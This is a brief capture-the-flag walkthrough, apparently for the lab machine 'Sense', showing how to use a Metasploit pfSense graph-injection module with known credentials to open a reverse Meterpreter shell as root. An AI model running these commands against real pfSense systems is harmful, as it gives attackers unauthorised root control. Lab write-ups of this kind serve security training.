# Alternative way to exploit Sense

An alternative way to exploit the box Sense is by using **Metasploit** after knowing the credentials.

```markdown
use exploit/unix/http/pfsense_graph_injection_exec

set LHOST tun0

set RHOSTS 10.10.10.60

set USERNAME rohit
set PASSWORD pfsense

set ReverseAllowProxy true

exploit
```

This starts a Meterpreter session as root.
